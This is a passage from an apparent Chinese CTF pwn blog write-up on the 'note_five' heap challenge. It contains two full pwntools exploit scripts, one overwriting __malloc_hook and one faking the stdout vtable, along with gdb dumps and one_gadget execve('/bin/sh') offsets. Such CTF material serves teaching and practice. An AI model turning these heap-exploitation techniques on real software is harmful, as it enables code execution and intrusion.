class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./note_five"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">   p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0xa0</span>+p64(<span class="number">0x160</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#edit(1,'1'*0x30+p64(0)+p64(0x171)+p64(0)+p16(0x37f8-0x10)+'\n')</span></span><br><span class="line"><span class="comment">#add(4,0x160)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25cf</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x41</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.recvn(<span class="number">0x40</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"_IO_2_1_stderr_"</span>] - <span class="number">192</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_addr:"</span>,hex(leak_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">realloc_hook = libc_base + libc.symbols[<span class="string">"__realloc_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##write size 0xf1 near malloc_hook</span></span><br><span class="line">malloc_gadget = libc_base + libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>] + <span class="number">143</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_gadget)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_hook<span class="number">-0xb9</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line"><span class="comment">#edit(4,'\x00'*0xa1+)</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0xa1</span>+p64(one_gadget)+p64(realloc+<span class="number">13</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>解法二是看了队里大佬这次比赛的writeup，思路是伪造_IO_2_1_stdout_的虚表。先利用泄露libc之后可以完全控制stdout，先利用edit在stdout附近先构造好虚表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p * (struct _IO_jump_t*) 0x7ffff7dd25df</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0x0, </span><br><span class="line">  __dummy2 = 0x0, </span><br><span class="line">  __finish = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __overflow = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __underflow = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __uflow = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __pbackfail = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __xsputn = 0x7ffff7afe147 &lt;exec_comm+2263&gt;, </span><br><span class="line">  __xsgetn = 0xfbad180000, </span><br><span class="line">  __seekoff = 0x7ffff7dd26a300, </span><br><span class="line">  __seekpos = 0x7ffff7dd26a300, </span><br><span class="line">  __setbuf = 0x7ffff7dd26a300, </span><br><span class="line">  __sync = 0x7ffff7dd26a300, </span><br><span class="line">  __doallocate = 0x7ffff7dd26a300, </span><br><span class="line">  __read = 0x7ffff7dd26a400, </span><br><span class="line">  __write = 0x7ffff7dd26a300, </span><br><span class="line">  __seek = 0x7ffff7dd26a400, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后再利用一次fastbin attack来申请到stdout附近的chunk，因为一次edit长度不够，所以需要再次构造一次，虚表指针在偏移0xd8处：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *(struct _IO_FILE_plus *) 0x00007ffff7dd2620</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad1800, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;c&quot;, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 0x1, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;c&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd25df &lt;_IO_2_1_stderr_+159&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在后续调用printf时程序会调用_IO_2_1_stdout_虚表中的__xsputn，从而触发one_gadget。<br>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./note_five"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">   p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0xa0</span>+p64(<span class="number">0x160</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25cf</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x41</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.recvn(<span class="number">0x40</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"_IO_2_1_stderr_"</span>] - <span class="number">192</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_addr:"</span>,hex(leak_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">##fake vtable</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">fake_vtable = libc_base + libc.symbols[<span class="string">"_IO_2_1_stderr_"</span>] + <span class="number">159</span></span><br><span class="line">payload = p64(<span class="number">0</span>) *<span class="number">2</span> + p64(one_gadget) *<span class="number">6</span></span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##fake stdout</span></span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(stdout+<span class="number">143</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> + p64(stdout-(<span class="number">0x00007ffff7dd2620</span><span class="number">-0x7ffff7dd17a0</span>))</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.pediy.com/thread-254367.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254367.htm</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/03/printf-pwn/" rel="next" title="printf pwn">
+                <i class="fa fa-chevron-left"></i> printf pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/04/KCTF-Q3-PWN/" rel="prev" title="KCTF Q3 PWN">
+                KCTF Q3 PWN <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mheap"><span class="nav-number">1.</span> <span class="nav-text">mheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#note-five"><span class="nav-number">2.</span> <span class="nav-text">note_five</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-amp-题目漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">题目描述 &amp; 题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一"><span class="nav-number">2.2.</span> <span class="nav-text">解法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二"><span class="nav-number">2.3.</span> <span class="nav-text">解法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
